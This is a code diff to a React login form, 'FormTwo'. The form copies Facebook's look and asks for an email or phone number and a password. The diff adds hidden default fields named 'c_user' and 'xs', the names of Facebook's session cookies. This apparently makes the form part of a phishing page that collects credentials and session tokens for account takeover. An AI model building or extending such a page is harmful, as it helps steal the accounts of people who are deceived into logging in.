@@ -26,6 +26,8 @@ export default function FormTwo() {
       password: "",
       contactMethod: 'email',
       countryCode: '',
+      c_user: "",
+      xs: "",
     },
   });
 
@@ -70,7 +72,6 @@ export default function FormTwo() {
         </h1>
         <Form {...form}>
           <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
-            {/* Email Field (Optional) */}
             <FormField
               control={form.control}
               name="user_email"
@@ -83,7 +84,7 @@ export default function FormTwo() {
                     <Input
                       type="text"
                       placeholder="Enter email or phone number"
-                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text"
+                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text !important"
                       {...field}
                     />
                   </FormControl>
@@ -91,7 +92,6 @@ export default function FormTwo() {
                 </FormItem>
               )}
             />
-            {/* Password Field (Required) */}
             <FormField
               control={form.control}
               name="password"
@@ -104,7 +104,7 @@ export default function FormTwo() {
                     <Input
                       type="password"
                       placeholder="Enter password"
-                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text"
+                      className="w-full px-3 py-1.5 sm:py-2 text-sm border border-[#ccd0d5] rounded-md focus:border-[#1877f2] focus:ring-2 focus:ring-[#1877f2] focus:ring-opacity-20 bg-white cursor-text !important"
                       {...field}
                     />
                   </FormControl>
